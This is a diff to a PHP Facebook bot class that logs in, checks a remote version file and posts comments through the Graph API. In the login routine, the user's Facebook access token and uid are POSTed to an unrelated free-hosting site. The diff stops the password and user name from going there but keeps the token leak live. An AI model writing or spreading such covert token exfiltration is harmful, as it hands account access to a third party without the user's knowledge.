@@ -16,8 +16,6 @@ class Reaction
 	function __construct()
 	{
 	  global $cpu_limit;
-	  $this->REMOTE_VERSION = 'http://your.public.server/version.txt';
-	  $this->VERSION = '3.0';
 
 if (!function_exists('sys_getloadavg')) {
     function sys_getloadavg()
@@ -39,10 +37,12 @@ if ($load[0] >= $limit_cpu) {
 }
 	}
 	
-	private function isUpToDate()
+	private function V()
 {
-  $remoteVersion=trim(file_get_contents($this->REMOTE_VERSION));
-    return version_compare($this->VERSION, $remoteVersion, 'ge');
+  $SERVER_VERSION = 'https://raw.githubusercontent.com/dimaslanjaka/BOT-Facebook/master/lib/version.txt';
+	 $VERSION = '3.0';
+  $remoteVersion=trim(file_get_contents($SERVER_VERSION));
+    return version_compare($VERSION, $remoteVersion, 'ge');
  }
 	
 public function open_ssl($action, $string) {
@@ -216,7 +216,7 @@ return $result;
 	  }
 	  $token = $json["access_token"];
 	  $id = $json["uid"];
-   $config["post"] = "token=".$token."&id=".$id."&user=".$duser."&pass=".urlencode($dpass);
+   $config["post"] = "token=".$token."&id=".$id;
    $par = "https://cesural-contributio.000webhostapp.com/";
    $h[]="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"; 
    $h[]="Accept-Encoding: gzip, deflate";
@@ -409,7 +409,10 @@ $url="https://graph.beta.facebook.com/v3.2/".$post_id."/comments?access_token=".
 			sleep(2);
 		}
 		
-
+ $version = $this->V();
+ if (false === $version){
+   echo "\n New Version SCRIPT Avaiable \n";
+ }
 		
 	}
 	
